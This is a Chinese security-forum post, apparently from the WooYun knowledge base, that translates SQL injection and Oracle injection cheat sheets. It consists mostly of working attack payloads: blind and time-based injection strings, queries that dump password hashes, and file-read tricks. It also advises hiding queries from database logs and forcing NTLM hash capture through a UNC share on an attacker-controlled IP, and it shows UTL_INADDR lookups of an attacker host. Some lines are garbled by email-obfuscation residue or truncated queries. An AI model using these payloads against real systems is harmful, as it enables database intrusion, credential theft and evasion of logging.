<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">SQL注入速查表（下）与Oracle注入速查表</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Yinz</a> <span class="bull">·</span> <time title="2015/08/27 10:53" ui-time="" datetime="2015/08/27 10:53" class="published ng-binding ng-isolate-scope">2015/08/27 10:53</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>一、SQL注入速查表（下）</h1><hr><h3>0x00 目录</h3><ol><li>盲注<ol><li>关于盲注</li><li>实战中的盲注实例</li></ol></li><li>延时盲注<ol><li><code>WAITFOR DELAY [time]</code>(S)</li><li>实例</li><li><code>BENCHMARK()</code>(M)</li><li>实例</li><li><code>pg_sleep(seconds)</code>(P)</li></ol></li><li>掩盖痕迹<ol><li><code>-sp_password log bypass</code>(S)</li></ol></li><li>注入测试</li><li>一些其他的MySQL笔记<ol><li>MySQL中好用的函数</li></ol></li><li>SQL注入的高级使用<ol><li>强制SQL Server来得到NTLM哈希</li><li>Bulk insert UNC共享文件 (S)</li></ol></li></ol><h3>0x01 盲注</h3><h4>关于盲注</h4><p>一个经过完整而优秀开发的应用一般来说你是<strong>看不到错误提示的</strong>，所以你是没办法从<code>Union</code>攻击和错误中提取出数据的</p><p><strong>一般盲注</strong>，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果</p><p><strong>完全盲注</strong>，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。</p><p>在一般盲注下你能够使用<strong>If语句</strong>或者&#42;&#42;WHERE查询注入&#92;*&#42;&#42;|(一般来说比较简单)&#42;，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在<code>SQL Server</code>中你需要使用<code>WAIT FOR DELAY '0:0:10'</code>，在MySQL中使用<code>BENCHMARK()</code>，在<code>PostgreSQL</code>中使用<code>pg_sleep(10)</code>，以及在<code>ORACLE</code>中的一些<code>PL/SQL小技巧</code>。</p><h4>实战中的盲注实例</h4><p>以下的输出来自一个真实的私人盲注工具在测试一个<code>SQL Server</code>后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。</p><p><strong>TRUE</strong>和<strong>FALSE</strong>标志代表了查询返回了<code>true</code>或<code>false</code></p><pre><code>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;78-- 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;103-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;89-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;83-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;80-- 


FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)
</code></pre><p>由于上面<strong>后两个查询都是false</strong>，我们能清楚的知道表名的第一个<strong>字符的ASCII码是80，也就是"P"</strong>。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(<code>bit by bit</code>)地读取数据。这些方法在不同条件下都很有效。</p><h3>延时盲注</h3><p>首先，只在完全没有提示(<code>really blind</code>)的情况下使用，否则请使用<code>1/0方式</code>通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(<code>timeout</code>)。</p><h4>WAITFOR DELAY <a href="S">time</a></h4><p>这就跟<code>sleep</code>差不多，等待特定的时间。通过CPU来让数据库进行等待。</p><pre><code>WAITFOR DELAY '0:0:10'--
</code></pre><p>你也可以这样用</p><pre><code>WAITFOR DELAY '0:0:0.51'
</code></pre><h4>实例</h4><ul><li>俺是sa吗？ <code>if (select user) = 'sa' waitfor delay '0:0:10'</code></li><li>ProductID =<code>1;waitfor delay '0:0:10'--</code></li><li>ProductID =<code>1);waitfor delay '0:0:10'--</code></li><li>ProductID =<code>1';waitfor delay '0:0:10'--</code></li><li>ProductID =<code>1');waitfor delay '0:0:10'--</code></li><li>ProductID =<code>1));waitfor delay '0:0:10'--</code></li><li>ProductID =<code>1'));waitfor delay '0:0:10'--</code></li></ul><h4>BENCHMARK()(M)</h4><p>一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。</p><pre><code>BENCHMARK(howmanytimes, do this)
</code></pre><h4>实例</h4><ul><li><p>俺是root吗？爽！ <code>IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))</code></p></li><li><p>判断表是否存在 <code>IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))</code></p></li></ul><h4>pg_sleep(seconds)(P)</h4><p>睡眠指定秒数。</p><ul><li><code>SELECT pg_sleep(10);</code>睡个十秒</li></ul><h3>掩盖痕迹</h3><h4>-sp_password log bypass(S)</h4><p>出于安全原因，<code>SQL Server</code>不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。</p><h3>0x02 注入测试</h3><p>这些测试既简单又清晰，适用于盲注和悄悄地搞。</p><ol><li><p><code>product.asp?id=4 (SMO)</code></p><ol><li><code>product.asp?id=5-1</code></li><li><code>product.asp?id=4 OR 1=1</code></li></ol></li><li><p><code>product.asp?name=Book</code></p><ol><li><code>product.asp?name=Bo’%2b’ok</code></li><li><code>product.asp?name=Bo’ || ’ok (OM)</code></li><li><code>product.asp?name=Book’ OR ‘x’=’x</code></li></ol></li></ol><h3>0x03 一些其他的MySQL笔记</h3><ul><li>子查询只能在MySQL4.1+使用</li><li>用户<ul><li><code>SELECT User,Password FROM mysql.user;</code></li></ul></li><li><code>SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;</code></li><li><code>SELECT ... INTO DUMPFILE</code><ul><li>把查询写入一个<strong>新文件</strong>中(不能修改已有文件)</li></ul></li><li>UDF功能<ul><li><code>create function LockWorkStation returns integer soname 'user32';</code></li><li><code>select LockWorkStation();</code></li><li><code>create function ExitProcess returns integer soname 'kernel32';</code></li><li><code>select exitprocess();</code></li></ul></li><li><code>SELECT USER();</code></li><li><code>SELECT password,USER() FROM mysql.user;</code></li><li><p>admin密码哈希的第一位</p><ul><li><code>SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;</code></li></ul></li><li><p>文件读取</p><ul><li><code>query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li></ul></li><li><p>MySQL读取文件内容</p><ul><li><p><strong>默认这个功能是没开启的！</strong></p><pre><code>create table foo( line blob ); 
load data infile 'c:/boot.ini' into table foo; 
select * from foo;
</code></pre></li></ul></li><li><p>MySQL里的各种延时</p></li><li><p><code>select benchmark( 500000, sha1( 'test' ) ); query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></p></li><li><p><code>select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );</code></p></li><li><strong>遍历数据，暴力猜解</strong><ul><li><code>select if( (ascii(substring(user(),1,1)) &gt;&gt; 7) &amp; 1,benchmark(100000,sha1('test')), 'false' );</code></li></ul></li></ul><h4>MySQL中好用的函数</h4><ul><li><p><code>MD5()</code></p><p>MD5哈希</p></li><li><p><code>SHA1()</code></p><p>SHA1哈希</p></li><li><p><code>PASSWORD()</code></p></li><li><p><code>ENCODE()</code></p></li><li><p><code>COMPRESS()</code></p><p>压缩数据，在盲注时读取大量数据很好用</p></li><li><p><code>ROW_COUNT()</code></p></li><li><p><code>SCHEMA()</code></p></li><li><p><code>VERSION()</code></p><p>跟<code>@@version</code>是一样的</p></li></ul><h3>SQL注入的高级使用</h3><p>一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem）</p><blockquote><p>Name:<code>' + (SELECT TOP 1 password FROM users ) + '</code></p><p>Email : <code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="493131093131672a2624">[email&#160;protected]</a></code></p></blockquote><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8d682b0f6b13116837196a1925681125e3ece0e8652c256b2d316935206930326a192569370b6935006823046808256a1709680f256820156b1b346b3e186b051b6b">[email&#160;protected]</a>骤，之后它就会把第一个用户的密码写进你的name里面。</p><h4>强制SQL Server来得到NTLM哈希</h4><p>这个攻击能够帮助你得到目标<code>SQL</code>服务器的<code>Window</code>s密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的<code>WindowsUNC</code>共享并通过抓包软件(<code>Cain &amp; Abel</code>)捕捉<code>NTLM session</code>。</p><h4>Bulk insert UNC共享文件 (S)</h4><p><code>bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'</code></p><h1>二、Oracle注入速查表</h1><p><small>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a></small></p><p>注：下面的一部分查询只能由admin执行，我会在查询的末尾以"<strong><code>-priv</code></strong>"标注。</p><p>探测版本：</p><pre><code>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;  
SELECT version FROM v$instance;
</code></pre><p>注释：</p><pre><code>SELECT 1 FROM dual — comment
</code></pre><p><em>注: Oracle的SELECT语句必须包含FROM从句，所以当我们并不是真的准备查询一个表的时候，我们必须使用一个假的表名‘dual’</em></p><p>当前用户：</p><pre><code>SELECT user FROM dual
</code></pre><p>列出所有用户：</p><pre><code>SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$; — priv
</code></pre><p>列出密码哈希：</p><pre><code>SELECT name, password, astatus FROM sys.user$ — priv, &lt;= 10g.  astatus能够在acct被锁定的状态下给你反馈
SELECT name,spare4 FROM sys.user$ — priv, 11g
</code></pre><p>密码破解：</p><p><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a>能够把Oracle8,9,10的基于DES的哈希破解掉</p><p>列出权限：</p><pre><code>SELECT * FROM session_privs; —当前用户的权限
SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, 列出指定用户的权限
SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, 找到拥有某个权限的用户
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
</code></pre><p>列出DBA账户：</p><pre><code>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, 列出DBA和对应权限
</code></pre><p>当前数据库：</p><pre><code>SELECT global_name FROM global_name;
SELECT name FROM v$database;
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL;
</code></pre><p>列出数据库：</p><pre><code>SELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)
</code></pre><p>– 通过查询TNS监听程序能够查询到其他数据库.详情看<a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a>。</p><p>列出字段名：</p><pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;
</code></pre><p>列出表名：</p><pre><code>SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
</code></pre><p>通过字段名找到对应表：</p><pre><code>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;  
</code></pre><p>— 注: 表名都是大写</p><p>查询第N行：</p><pre><code>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — 查询第9行(从1开始数)
</code></pre><p>查询第N个字符：</p><pre><code>SELECT substr(‘abcd’, 3, 1) FROM dual; — 得到第三个字符‘c’
</code></pre><p>按位与(<code>Bitwise AND</code>)：</p><pre><code>SELECT bitand(6,2) FROM dual; — 返回2
SELECT bitand(6,1) FROM dual; — 返回0
</code></pre><p>ASCII值转字符：</p><pre><code>SELECT chr(65) FROM dual; — 返回A
</code></pre><p>字符转ASCII码：</p><pre><code>SELECT ascii(‘A’) FROM dual; — 返回65
</code></pre><p>类型转换：</p><pre><code>SELECT CAST(1 AS char) FROM dual;
SELECT CAST(’1′ AS int) FROM dual;
</code></pre><p>拼接字符：</p><pre><code>SELECT ‘A’ || ‘B’ FROM dual; — 返回AB
</code></pre><p>IF语句：</p><pre><code>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; 
</code></pre><p>— 跟<code>SELECT</code>语句在一起时不太管用</p><p><code>Case</code>语句：</p><pre><code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — 返回1
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — 返回2
</code></pre><p>绕过引号：</p><pre><code>SELECT chr(65) || chr(66) FROM dual; — 返回AB
</code></pre><p>延时：</p><pre><code>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, 在SELECT中用不了
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 如果反查很慢
SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — 如果正查很慢
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — 如果发送TCP包被拦截或者很慢
</code></pre><p>— 更多关于延时的内容请看<a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a></p><p>发送DNS请求：</p><pre><code>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
</code></pre><p>命令执行：</p><p>如果目标机装了JAVA就能执行命令，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">看这里</a></p><p>有时候ExtProc也可以，不过我一般都成功不了，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">看这里</a></p><p>本地文件读取：</p><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a>有时候能用。如果下面的语句没有返回null就行。</p><pre><code>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;
</code></pre><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">JAVA</a>能用来读取和写入文件，除了<code>Oracle Express</code></p><p>主机名称、IP地址：</p><pre><code>SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual; — 查IP
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 查主机名称
</code></pre><p>定位DB文件：</p><pre><code>SELECT name FROM V$DATAFILE;
</code></pre><p>默认系统和数据库：</p><pre><code>SYSTEM
SYSAUX
</code></pre><h3>额外小贴士：</h3><p>一个字符串列出所有表名：</p><pre><code>select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,') from all_tables 
</code></pre><p>– 当你union联查注入的时候只有一行能用与返回数据时使用</p><p>盲注排序：</p><pre><code>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end 
</code></pre><p>— 你必须知道两个拥有相同数据类型的字段名才能用</p><p>译者注： <code>Oracle</code>注入速查表的作者这边还有<code>MSSQL</code>、<code>MySQL</code>、<code>PostgreSQL</code>、<code>Ingres</code>、<code>DB2</code>、<code>Informix</code>等数据库的速查表，不过我看Drops里面<code>MSSQL</code>和<code>MySQL</code>都已经有比较好的文章了，所以如果有需求的话请在评论留言。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">joker</span> <span class="reply-time">2015-12-21 14:10:03</span></div><p></p><p>LZ 能把其他速查表的链接发一下么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">情痴</span> <span class="reply-time">2015-12-08 13:26:42</span></div><p></p><p>学习了，谢谢楼主分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">咖啡</span> <span class="reply-time">2015-08-28 20:57:50</span></div><p></p><p>《sql注入攻击与防御》书里有， 快速注入参考。。比较全，你们可以去看看～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Yinz</span> <span class="reply-time">2015-08-27 23:00:04</span></div><p></p><p>@Raven MySQL和MSSQL以及PostgreSQL的速查表在drops里都有比较好的了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Raven</span> <span class="reply-time">2015-08-27 17:04:10</span></div><p></p><p>我还想看看其他数据库的速查表怎么办。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">终于明白</span> <span class="reply-time">2015-08-27 17:00:23</span></div><p></p><p>楼主辛苦了，小白收藏个先</p><p></p></div></div></div></div></div></main>